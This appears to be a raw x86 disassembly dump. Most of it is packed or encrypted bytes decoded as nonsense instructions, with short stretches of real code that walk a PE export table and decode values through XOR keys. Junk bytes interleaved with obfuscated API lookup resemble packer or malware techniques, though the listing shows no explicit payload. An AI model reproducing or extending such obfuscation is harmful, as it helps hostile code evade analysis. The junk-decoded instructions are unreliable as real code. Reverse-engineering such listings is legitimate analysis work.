  408bfa:	jle    0x408c7a
  408bfc:	es pop esp
  408bfe:	mov    edx,0xd53bbd9c
  408c03:	inc    ebx
  408c04:	mov    cl,0x4a
  408c06:	fisubr DWORD PTR [edx-0x4966820b]
  408c0c:	(bad)  ds:0x75a48b4c
  408c12:	push   es
  408c13:	cmp    eax,0xffffffcb
  408c16:	in     al,dx
  408c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c18:	(bad)  
  408c19:	jnp    0x408c60
  408c1b:	push   eax
  408c1c:	sub    dh,ch
  408c1e:	mov    ah,0x13
  408c20:	pop    es
  408c21:	outs   dx,DWORD PTR ds:[esi]
  408c22:	jg     0x408c02
  408c24:	mov    esp,0xf926b9cf
  408c29:	cdq    
  408c2a:	fsubr  QWORD PTR [ebp-0x22f6d99]
  408c30:	fiadd  WORD PTR [esi]
  408c32:	sub    cl,bl
  408c34:	out    0xd,eax
  408c36:	and    cl,BYTE PTR [eax-0x41f335cf]
  408c3c:	popf   
  408c3d:	test   eax,0xdbef2db0
  408c42:	inc    ebp
  408c43:	stc    
  408c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c45:	adc    DWORD PTR [ecx],0x16
  408c48:	rcr    BYTE PTR [ebp-0x4a1b6595],cl
  408c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4f:	clc    
  408c50:	into   
  408c51:	add    edx,DWORD PTR [ebx]
  408c53:	fnsave [ebx-0x64]
  408c56:	push   es
  408c57:	aad    0x1d
  408c59:	int    0xe2
  408c5b:	mov    BYTE PTR [eax],al
  408c5d:	(bad)  
  408c5e:	jle    0x408c66
  408c60:	std    
  408c61:	fsubr  QWORD PTR [ecx-0x4d]
  408c64:	pop    DWORD PTR [esi+0x56a984b1]
  408c6a:	pusha  
  408c6b:	sbb    BYTE PTR [esi+0x42],0xb
  408c6f:	(bad)  [edx+ecx*1+0x3efa8533]
  408c76:	sahf   
  408c77:	xchg   ecx,eax
  408c78:	push   esi
  408c79:	stos   DWORD PTR es:[edi],eax
  408c7a:	mov    ecx,edi
  408c7c:	(bad)  
  408c7d:	jp     0x408ccf
  408c7f:	lods   al,BYTE PTR ds:[esi]
  408c80:	aaa    
  408c81:	add    DWORD PTR [ebx-0x4f282f33],eax
  408c87:	jl     0x408c8c
  408c89:	mov    bh,0x43
  408c8b:	push   eax
  408c8c:	and    al,0xfe
  408c8e:	fsub   DWORD PTR [ebp+0x41b7389]
  408c94:	sub    edx,DWORD PTR [ecx]
  408c96:	cmc    
  408c97:	js     0x408d12
  408c99:	xchg   ebx,eax
  408c9a:	xchg   edx,eax
  408c9b:	ror    ebx,cl
  408c9d:	outs   dx,DWORD PTR ds:[esi]
  408c9e:	xor    eax,0x4bd6fd0e
  408ca3:	sub    edi,ecx
  408ca5:	mov    ecx,0xa1cf1314
  408caa:	lahf   
  408cab:	pop    edi
  408cac:	mov    dh,0xd9
  408cae:	pop    ebp
  408caf:	lea    edx,[edi]
  408cb1:	out    dx,al
  408cb2:	jle    0x408d1f
  408cb4:	add    DWORD PTR [eax+0x3c],0x20bf54b4
  408cbb:	jg     0x408d1e
  408cbd:	es ret 
  408cbf:	pop    ecx
  408cc0:	xor    esi,DWORD PTR [esi]
  408cc2:	(bad)  
  408cc3:	ss pop ecx
  408cc5:	mov    dl,0xbb
  408cc7:	ins    DWORD PTR es:[edi],dx
  408cc8:	in     al,dx
  408cc9:	push   ebx
  408cca:	(bad)  
  408ccb:	fld    TBYTE PTR [ebp+0x37]
  408cce:	dec    esp
  408ccf:	jmp    0xef42aa3e
  408cd4:	jo     0x408cca
  408cd6:	adc    cl,al
  408cd8:	xor    al,0x76
  408cda:	jno    0x408cb6
  408cdc:	ret    
  408cdd:	lock icebp 
  408cdf:	ins    BYTE PTR es:[edi],dx
  408ce0:	mov    ch,0x3
  408ce2:	inc    edx
  408ce3:	pop    esi
  408ce4:	loope  0x408cd1
  408ce6:	push   es
  408ce7:	lods   eax,DWORD PTR ds:[esi]
  408ce8:	sbb    BYTE PTR [ecx+0x77bcf44e],dh
  408cee:	mov    ch,0xc7
  408cf0:	and    eax,0x3d1d7625
  408cf5:	pop    ebp
  408cf6:	cmp    BYTE PTR [edi+edi*1-0x3611333b],ch
  408cfd:	sub    ebp,DWORD PTR [ebp+0x2]
  408d00:	adc    esp,DWORD PTR [edx]
  408d02:	daa    
  408d03:	retf   
  408d04:	pusha  
  408d05:	inc    edi
  408d06:	and    bh,bl
  408d08:	cs xchg ebx,eax
  408d0a:	rcr    cl,cl
  408d0c:	pusha  
  408d0d:	scas   al,BYTE PTR es:[edi]
  408d0e:	dec    esi
  408d0f:	jp     0x408c98
  408d11:	sub    eax,DWORD PTR [eax+edx*4+0x77]
  408d15:	les    esi,FWORD PTR [eax-0x6841842e]
  408d1b:	in     eax,0x20
  408d1d:	sar    DWORD PTR [eax+eax*2-0x203ef192],cl
  408d24:	rcl    DWORD PTR [edx+ebp*8-0x1b5912df],0x67
  408d2c:	jecxz  0x408d2d
  408d2e:	mov    ebx,0xfc731d09
  408d33:	in     eax,0x4d
  408d35:	test   al,0x65
  408d37:	mov    ds,WORD PTR [ecx]
  408d39:	xchg   ecx,eax
  408d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3b:	sbb    al,BYTE PTR [eax+ecx*1-0x2d4a933a]
  408d42:	daa    
  408d43:	fiadd  WORD PTR [edx+0x1706e843]
  408d49:	test   eax,0x9ff5ceeb
  408d4e:	rcl    dh,1
  408d50:	or     eax,0x24b19116
  408d55:	mov    eax,ds:0xb232fdf7
  408d5a:	adc    al,0xe8
  408d5c:	mov    esp,0x8d77cc10
  408d61:	jl     0x408d19
  408d63:	adc    dh,cl
  408d65:	dec    ebx
  408d66:	out    dx,al
  408d67:	stos   BYTE PTR es:[edi],al
  408d68:	ret    
  408d69:	repnz out 0x56,al
  408d6c:	repnz loope 0x408dd3
  408d6f:	jbe    0x408d6e
  408d71:	int3   
  408d72:	mov    ds:0xd0553a6f,al
  408d77:	pmullw mm3,QWORD PTR [esi]
  408d7a:	test   BYTE PTR [ebx+esi*4],0x4f
  408d7e:	jg     0x408db6
  408d80:	xor    BYTE PTR [ebx-0x7],bl
  408d83:	jmp    0x8310:0xfe0bdf94
  408d8a:	jnp    0x408dfe
  408d8c:	mov    cl,0x22
  408d8e:	mov    ch,0x97
  408d90:	push   edx
  408d91:	(bad)  
  408d92:	retf   0xc8dd
  408d95:	(bad)  
  408d96:	push   edi
  408d97:	sub    BYTE PTR [esp+eax*8-0x74],al
  408d9b:	pop    ebx
  408d9c:	popf   
  408d9d:	push   eax
  408d9e:	xchg   edi,eax
  408d9f:	inc    eax
  408da0:	cwde   
  408da1:	or     dh,bl
  408da3:	cdq    
  408da4:	xor    ah,al
  408da6:	mov    bl,dh
  408da8:	in     al,dx
  408da9:	dec    ecx
  408daa:	pop    eax
  408dab:	jns    0x408d84
  408dad:	cdq    
  408dae:	mov    ecx,0x1378fc45
  408db3:	xor    edi,DWORD PTR [esp+edi*1+0x455989d6]
  408dba:	fist   WORD PTR [bx+si-0x26fd]
  408dbf:	add    al,0xb2
  408dc1:	cli    
  408dc2:	jg     0x408dcb
  408dc4:	push   ds
  408dc5:	call   0x1a24:0xc6e3f3ad
  408dcc:	neg    DWORD PTR [edi-0x3e54e86b]
  408dd2:	mov    edx,ss
  408dd4:	xchg   edi,eax
  408dd5:	mov    cl,0x16
  408dd7:	sub    ch,dh
  408dd9:	icebp  
  408dda:	or     BYTE PTR [eax+0x17],ch
  408ddd:	or     al,0x36
  408ddf:	sbb    ebp,DWORD PTR [edx-0x6f]
  408de2:	and    al,0x1
  408de4:	in     al,dx
  408de5:	push   0xffffffa5
  408de7:	arpl   WORD PTR [edx+0x2e],ax
  408dea:	aad    0xff
  408dec:	pop    ds
  408ded:	xchg   edx,eax
  408dee:	inc    eax
  408def:	ja     0x408e09
  408df1:	shr    DWORD PTR [ebp+0x3e44f4bf],1
  408df7:	leave  
  408df8:	aam    0x9d
  408dfa:	outs   dx,DWORD PTR ds:[esi]
  408dfb:	jns    0x408da0
  408dfd:	popf   
  408dfe:	in     al,0x60
  408e00:	fild   WORD PTR [ebx+ebx*1]
  408e03:	fstp   QWORD PTR [ebp+0x86ebdc2]
  408e09:	push   ss
  408e0a:	push   edi
  408e0b:	mov    eax,ds:0x2f812752
  408e10:	mov    ?,WORD PTR [edi-0x5fa8ddab]
  408e16:	stos   DWORD PTR es:[edi],eax
  408e17:	loope  0x408dab
  408e19:	xchg   ebx,eax
  408e1a:	neg    BYTE PTR [esi-0x3b]
  408e1d:	adc    eax,ebp
  408e1f:	cmp    eax,0x7da90ec9
  408e24:	into   
  408e25:	sbb    esp,DWORD PTR [esi-0x75]
  408e28:	inc    ebp
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x17abcd9d
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	in     eax,0x45
  408ec6:	adc    ecx,DWORD PTR [edx]
  408ec8:	dec    edx
  408ec9:	inc    esi
  408eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecb:	lods   al,BYTE PTR ds:[esi]
  408ecc:	loop   0x408e56
  408ece:	jp     0x408f40
  408ed0:	sbb    BYTE PTR gs:[eax+0x6e75b7ca],0xe5
  408ed8:	dec    edx
  408ed9:	lock xor DWORD PTR [ebx-0x74],edi
  408edd:	int    0x82
  408edf:	pop    es
  408ee0:	scas   al,BYTE PTR es:[edi]
  408ee1:	ja     0x408f52
  408ee3:	div    DWORD PTR [ebx-0x17972104]
  408ee9:	cmp    DWORD PTR [ecx],ebp
  408eeb:	lds    ebx,FWORD PTR [edx]
  408eed:	push   ecx
  408eee:	inc    ebx
  408eef:	je     0x408f30
  408ef1:	(bad)  
  408ef2:	in     eax,0x33
  408ef4:	bound  esi,QWORD PTR [ebp-0x47]
  408ef7:	ins    DWORD PTR es:[edi],dx
  408ef8:	xlat   BYTE PTR ds:[ebx]
  408ef9:	sbb    BYTE PTR [ebx],ch
  408efb:	cmp    edi,edi
  408efd:	fmul   st(3),st
  408eff:	add    bh,BYTE PTR [eax+0x2917c574]
  408f05:	xchg   edi,eax
  408f06:	mov    DWORD PTR [ecx-0x47684b5b],ebx
  408f0c:	mov    ch,0x5b
  408f0e:	inc    ebx
  408f0f:	fsubr  st,st(1)
  408f11:	push   edx
  408f12:	(bad)  
  408f14:	jl     0x408f89
  408f16:	mov    ecx,0x710d5d2e
  408f1b:	es leave 
  408f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1e:	mov    edi,gs
  408f20:	sub    DWORD PTR [eax+0x62],esp
  408f23:	mov    eax,ds:0x14fb17f3
  408f28:	rcl    al,1
  408f2a:	fiadd  WORD PTR [eax-0x613dd056]
  408f30:	std    
  408f31:	icebp  
  408f32:	fmul   QWORD PTR [ecx-0x7975da11]
  408f38:	mov    dh,0x52
  408f3a:	add    eax,0xe6548d7f
  408f3f:	repz fiadd DWORD PTR [ecx]
  408f42:	ror    cl,cl
  408f44:	leave  
  408f45:	push   esp
  408f46:	stc    
  408f47:	into   
  408f48:	stos   BYTE PTR es:[edi],al
  408f49:	or     BYTE PTR [edi+0x46],dl
  408f4c:	adc    ebx,DWORD PTR [ecx-0x19]
  408f4f:	lahf   
  408f50:	pop    ds
  408f51:	push   ecx
  408f52:	mov    ?,WORD PTR cs:[ecx+0x6ea7c439]
  408f59:	(bad)  
  408f5a:	out    dx,al
  408f5b:	mov    al,0xcf
  408f5d:	mov    ebp,0x9b54f64b
  408f62:	jle    0x408f6a
  408f64:	xor    ch,dl
  408f66:	add    edi,DWORD PTR [eax-0xe]
  408f69:	scas   al,BYTE PTR es:[edi]
  408f6a:	push   esp
  408f6b:	call   0x50cd:0x5f510951
  408f72:	sub    eax,0x7ff50e00
  408f77:	push   0x71
  408f79:	icebp  
  408f7a:	int3   
  408f7b:	mov    edx,0x42f71d2f
  408f80:	je     0x408fd8
  408f82:	repz add al,0xb2
  408f86:	js     0x408f95
  408f88:	pop    ss
  408f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f8a:	add    al,BYTE PTR [edi+0x76480cc2]
  408f90:	inc    eax
  408f91:	push   0x79320aad
  408f96:	and    BYTE PTR [eax],bl
  408f98:	pop    ebx
  408f99:	xor    eax,0xf62c6313
  408f9e:	inc    edx
  408f9f:	xlat   BYTE PTR ds:[ebx]
  408fa0:	retf   0x865
  408fa3:	enter  0x8262,0x66
  408fa7:	xlat   BYTE PTR ds:[ebx]
  408fa8:	lods   al,BYTE PTR ds:[esi]
  408fa9:	loopne 0x408fc0
  408fab:	imul   edi,ebp,0x2c
  408fae:	leave  
  408faf:	add    esi,eax
  408fb1:	mov    ch,0x90
  408fb3:	sbb    BYTE PTR [edi+ebx*2],0x4d
  408fb7:	and    DWORD PTR [edx],edi
  408fb9:	or     DWORD PTR [edi+0x5f53b68f],eax
  408fbf:	rcl    DWORD PTR fs:[esi+edi*8+0x39],cl
  408fc4:	jns    0x40901f
  408fc6:	inc    edi
  408fc8:	sub    DWORD PTR [esi-0x77],esi
  408fcb:	or     ecx,DWORD PTR [esi-0x35e5179f]
  408fd1:	shl    BYTE PTR [eax+0x42],cl
  408fd4:	push   edx
  408fd5:	fwait
  408fd6:	ins    BYTE PTR es:[edi],dx
  408fd7:	in     al,dx
  408fd8:	into   
  408fd9:	stc    
  408fda:	push   eax
  408fdb:	sub    al,0x5e
  408fdd:	ins    DWORD PTR es:[edi],dx
  408fde:	sbb    dh,BYTE PTR [ecx-0x7be74798]
  408fe4:	fimul  DWORD PTR [edi]
  408fe6:	fcomp  QWORD PTR [eax]
  408fe8:	add    al,bh
  408fea:	mov    bh,0x71
  408fec:	jnp    0x408fcb
  408fee:	imul   edi,DWORD PTR [ebp+0x114464a],0xb9b154ef
  408ff8:	ins    BYTE PTR es:[edi],dx
  408ff9:	(bad)  
  408ffa:	or     ecx,DWORD PTR [ecx]
  408ffc:	push   ecx
  408ffd:	and    edi,DWORD PTR [edi]
  408fff:	and    BYTE PTR [ebx],dl
  409001:	jl     0x409043
  409003:	xchg   DWORD PTR [eax+0x73],esp
  409006:	xor    ch,BYTE PTR [bp+0x39]
  40900a:	jb     0x409046
  40900c:	jmp    DWORD PTR [edi+0x36]
  40900f:	xor    al,0x4d
  409011:	pop    edx
  409012:	int3   
  409013:	inc    eax
  409014:	sub    bl,ch
  409016:	cmc    
  409017:	xchg   edx,ecx
  409019:	call   0xad80:0xbdd84e42
  409020:	mov    dh,BYTE PTR [ebx+0x4ef5d8e3]
  409026:	aam    0x83
  409028:	xchg   ecx,eax
  409029:	cli    
  40902a:	and    BYTE PTR [edi],bh
  40902c:	sbb    al,0x7d
  40902e:	lods   al,BYTE PTR ds:[esi]
  40902f:	dec    edi
  409030:	repnz or bl,bh
  409033:	xor    DWORD PTR [edi-0x41],0xffffff8b
  409037:	or     dl,dh
  409039:	aas    
  40903a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40903b:	inc    bp
  40903d:	pop    ecx
  40903e:	xor    al,0xba
  409040:	daa    
  409041:	(bad)  
  409042:	loopne 0x409087
  409044:	bts    DWORD PTR [edx+0x2e61b441],0xc8
  40904c:	sub    edx,DWORD PTR [esi+0x6dd1859f]
  409052:	pop    ecx
  409053:	add    esi,ebp
  409055:	cld    
  409056:	adc    al,0xab
  409058:	pop    ebx
  409059:	std    
  40905a:	jecxz  0x4090bd
  40905c:	pop    ebp
  40905d:	(bad)  
  40905f:	retf   
  409060:	xor    eax,0xb4e98964
  409065:	mov    dh,0x3c
  409067:	dec    edi
  409068:	mov    dh,0x25
  40906a:	loope  0x409008
  40906c:	xchg   esi,eax
  40906d:	sbb    edx,ebp
  40906f:	das    
  409070:	inc    ebx
  409071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409072:	pop    ss
  409073:	add    BYTE PTR [eax+0x6b],al
  409076:	dec    esi
  409077:	neg    DWORD PTR [edi+ecx*8-0x62cab9a6]
  40907e:	push   esi
  40907f:	lsl    edi,si
  409082:	das    
  409083:	dec    edx
  409084:	dec    edi
  409085:	mov    edi,0x7b42eedb
  40908a:	jnp    0x4090ea
  40908c:	sub    ah,BYTE PTR [eax-0x40]
  40908f:	loope  0x40904c
  409091:	pop    ds
  409092:	out    dx,eax
  409093:	sahf   
  409094:	cmp    al,0xc6
  409096:	loop   0x409095
  409098:	stos   DWORD PTR es:[edi],eax
  409099:	adc    al,0xb6
  40909b:	fimul  DWORD PTR [esi+ebx*8-0x701885a0]
  4090a2:	inc    ebx
  4090a3:	jecxz  0x409051
  4090a5:	in     al,0xa9
  4090a7:	adc    ebp,DWORD PTR [ebx+0x7c]
  4090aa:	mov    bh,0x59
  4090ac:	sbb    eax,0x2164eb14
  4090b1:	pop    ebx
  4090b2:	ss pop esi
  4090b4:	adc    al,0x2e
  4090b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b7:	call   0xd634928c
  4090bc:	cmp    eax,0xa76aad23
  4090c1:	mov    edx,0xd7e89587
  4090c6:	ins    BYTE PTR es:[edi],dx
  4090c7:	in     eax,dx
  4090c8:	jg     0x409137
  4090ca:	pop    eax
  4090cb:	mov    edx,0x55f7f272
  4090d0:	xor    al,0xe
  4090d2:	into   
  4090d3:	out    0x3f,al
  4090d5:	push   ebp
  4090d6:	xchg   ebp,eax
  4090d7:	sbb    DWORD PTR [ebx+esi*4-0x40dbbc7a],ebx
  4090de:	les    ebp,FWORD PTR [edx+0x11]
  4090e1:	fimul  DWORD PTR [edi-0x79b58df3]
  4090e7:	sub    dl,cl
  4090e9:	test   al,0x39
  4090eb:	fwait
  4090ec:	out    0x40,al
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xac
  409163:	and    BYTE PTR [esi+0x7edf32af],bl
  409169:	jle    0x40918f
  40916b:	jl     0x4091eb
  40916d:	jle    0x4091b0
  40916f:	jae    0x4091c8
  409171:	sbb    DWORD PTR [esi-0x752e6d3a],edi
  409177:	iret   
  409178:	inc    ebp
  409179:	std    
  40917a:	lds    ebx,FWORD PTR [eax-0x78]
  40917d:	sahf   
  40917e:	xchg   ebx,eax
  40917f:	xchg   esp,eax
  409180:	inc    ebx
  409181:	aad    0x33
  409183:	dec    esp
  409184:	arpl   WORD PTR [esi-0x17],si
  409187:	push   ecx
  409188:	dec    ebp
  409189:	std    
  40918a:	dec    esi
  40918b:	stc    
  40918c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40918d:	jl     0x409201
  40918f:	xchg   eax,ebx
  409191:	rcr    edx,1
  409193:	int    0x9e
  409195:	jns    0x4091de
  409197:	add    DWORD PTR [esi],ecx
  409199:	ja     0x409186
  40919b:	or     bh,BYTE PTR [edx+0x0]
  40919e:	and    eax,0xf38c7ab5
  4091a3:	int3   
  4091a4:	dec    esp
  4091a5:	sbb    bh,BYTE PTR [eax-0x34b6722f]
  4091ab:	jo     0x40919c
  4091ad:	inc    esi
  4091ae:	mov    al,ds:0x728d02a
  4091b3:	fadd   st(7),st
  4091b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b6:	ret    0xb879
  4091b9:	fnstsw WORD PTR [ecx+0x4d]
  4091bc:	push   ss
  4091bd:	sbb    BYTE PTR [ecx],bl
  4091bf:	sub    ecx,DWORD PTR [edx]
  4091c1:	mul    BYTE PTR [esi-0x46]
  4091c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091c5:	push   edi
  4091c6:	ds stc 
  4091c8:	(bad)  
  4091c9:	shr    dh,cl
  4091cb:	push   ecx
  4091cc:	(bad)  
  4091cd:	cs pop ecx
  4091cf:	mov    ebx,0xe0cbe817
  4091d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d5:	ret    
  4091d6:	jne    0x40923d
  4091d8:	fwait
  4091d9:	les    ebp,FWORD PTR [eax]
  4091db:	out    dx,al
  4091dc:	outs   dx,BYTE PTR ds:[esi]
  4091dd:	pop    esp
  4091de:	clc    
  4091df:	(bad)  
  4091e0:	retf   
  4091e1:	ins    BYTE PTR es:[edi],dx
  4091e2:	push   0xffffff97
  4091e4:	push   ecx
  4091e5:	cmp    BYTE PTR [esi+0x1c],al
  4091e8:	(bad)  ds:0xd840a497
  4091ee:	inc    edi
  4091ef:	in     eax,0x4a
  4091f1:	jp     0x40921c
  4091f3:	cmp    al,BYTE PTR [ebx-0x14]
  4091f6:	xchg   BYTE PTR [ebx-0x1a],dl
  4091f9:	shr    BYTE PTR [ebp-0x29],cl
  4091fc:	push   ebx
  4091fd:	inc    eax
  4091fe:	stc    
  4091ff:	jp     0x4091f0
  409201:	jo     0x40921a
  409203:	repz stc 
  409205:	or     ebp,DWORD PTR [ebp+edi*1+0x2d]
  409209:	out    dx,al
  40920a:	dec    ecx
  40920b:	sub    ah,cl
  40920d:	jno    0x4091dd
  40920f:	pop    eax
  409210:	(bad)  
  409211:	push   0xffffffaa
  409213:	inc    edx
  409214:	ins    BYTE PTR es:[edi],dx
  409215:	je     0x409281
  409217:	xor    BYTE PTR [ebx-0x29],bl
  40921a:	ret    
  40921b:	ss dec eax
  40921d:	mov    ah,0xe2
  40921f:	jo     0x409210
  409221:	xchg   ecx,eax
  409222:	inc    edx
  409223:	or     edx,DWORD PTR [ebx-0x41]
  409226:	or     DWORD PTR [eax+esi*4-0x47da6466],ebx
  40922d:	iret   
  40922e:	xor    ecx,DWORD PTR [edx]
  409230:	push   ecx
  409231:	xor    edi,DWORD PTR [edx+0x12]
  409234:	pop    es
  409235:	jnp    0x4091ba
  409237:	out    dx,eax
  409238:	data16 jae 0x409233
  40923b:	adc    DWORD PTR [ebx+eax*4-0x53],ecx
  40923f:	hlt    
  409240:	stos   DWORD PTR es:[edi],eax
  409241:	jmp    0x413e:0x6b2f5e09
  409248:	add    edx,DWORD PTR [ebp+0x22]
  40924b:	sbb    BYTE PTR [ebx+ebp*8],0xe7
  40924f:	fnstenv [edx-0x4f]
  409252:	jle    0x40920b
  409254:	sbb    al,BYTE PTR [ebx]
  409256:	leave  
  409257:	sub    BYTE PTR [eax+0x3afbd66e],0x19
  40925e:	or     al,0x5f
  409260:	xlat   BYTE PTR ds:[ebx]
  409261:	imul   eax,DWORD PTR [ebx-0x76dc7cac],0x86c0361b
  40926b:	ins    DWORD PTR es:[edi],dx
  40926c:	call   0x2f0ea1d2
  409271:	daa    
  409272:	test   eax,0x9b3d6bc7
  409277:	call   edi
  409279:	mov    ds:0xf015256,eax
  40927e:	dec    esp
  40927f:	fs leave 
  409281:	xchg   esp,edx
  409283:	mov    eax,0xc9de98a2
  409288:	mov    dl,ch
  40928a:	jle    0x40922e
  40928c:	inc    edx
  40928d:	sbb    BYTE PTR [ebx+ebx*4+0xb],cl
  409291:	fdivr  st,st(1)
  409293:	cmp    BYTE PTR [esi],dh
  409295:	pop    esi
  409296:	mov    ebx,DWORD PTR [edx+0x6b]
  409299:	call   0x3963c7d6
  40929e:	mov    esi,0x31ccbb52
  4092a3:	and    eax,0xc759f02
  4092a8:	mov    al,0x8e
  4092aa:	frstpm(287 only) 
  4092ac:	push   esi
  4092ad:	push   ds
  4092ae:	out    dx,al
  4092af:	dec    ebp
  4092b0:	test   BYTE PTR [esi-0x3257c8fa],bh
  4092b6:	sbb    bh,cl
  4092b8:	lods   al,BYTE PTR ds:[esi]
  4092b9:	(bad)  
  4092ba:	loop   0x40932f
  4092bc:	into   
  4092bd:	dec    ebx
  4092be:	cmp    BYTE PTR [eax-0x1e],dh
  4092c1:	jl     0x409321
  4092c3:	out    dx,al
  4092c4:	outs   dx,DWORD PTR ds:[esi]
  4092c5:	push   edx
  4092c6:	inc    esi
  4092c7:	test   BYTE PTR [esi-0x7d0352f4],0x63
  4092ce:	jb     0x409342
  4092d0:	push   ebx
  4092d1:	mov    ds:0xf001971b,al
  4092d6:	(bad)  [ecx+eax*1]
  4092d9:	cmp    al,0x82
  4092db:	pop    ebx
  4092dc:	std    
  4092dd:	push   ebx
  4092de:	sub    edi,DWORD PTR [eax-0x16331ab]
  4092e4:	data16 mov dh,0x33
  4092e7:	pop    edi
  4092e8:	push   eax
  4092e9:	jno    0x4092d5
  4092eb:	cmp    BYTE PTR ds:0x4ea99083,bl
  4092f1:	jb     0x40934b
  4092f3:	cmp    DWORD PTR [eax+eiz*2],edi
  4092f6:	adc    DWORD PTR [edi],esi
  4092f8:	cli    
  4092f9:	xchg   ebp,eax
  4092fa:	push   ss
  4092fb:	xor    al,al
  4092fd:	(bad)  
  4092fe:	out    dx,eax
  4092ff:	loop   0x40935b
  409301:	inc    esp
  409302:	inc    ecx
  409303:	les    ecx,FWORD PTR [edx]
  409305:	fwait
  409306:	out    dx,al
  409307:	pop    ss
  409308:	inc    esi
  409309:	jg     0x409290
  40930b:	cmp    BYTE PTR [edx+ebp*2+0x6ffd3384],ah
  409312:	and    DWORD PTR [ebx],esp
  409314:	test   al,0xd8
  409316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409317:	fdiv   st,st(7)
  409319:	mov    ds:0x3300d8d,eax
  40931e:	cld    
  40931f:	add    dl,BYTE PTR fs:[edi]
  409322:	jp     0x40938a
  409324:	push   eax
  409325:	xchg   DWORD PTR [eax+0x58ff2b46],ebx
  40932b:	aam    0x48
  40932d:	(bad)  
  40932e:	push   eax
  40932f:	xchg   edi,eax
  409330:	pop    ecx
  409331:	mov    ah,0x36
  409333:	ficomp DWORD PTR [edx+0x70]
  409336:	push   ebp
  409337:	jb     0x409387
  409339:	xor    DWORD PTR [edx],0xffffff9d
  40933c:	retf   0xbb90
  40933f:	sahf   
  409340:	or     al,0x23
  409342:	cld    
  409343:	push   edx
  409344:	cdq    
  409345:	mov    WORD PTR [edx-0x4a8894be],es
  40934b:	cmc    
  40934c:	not    DWORD PTR [esi]
  40934e:	pusha  
  40934f:	push   ebx
  409350:	jmp    0x4093ad
  409352:	inc    eax
  409353:	jge    0x40935d
  409355:	jl     0x4092f4
  409357:	mov    bl,0x92
  409359:	pusha  
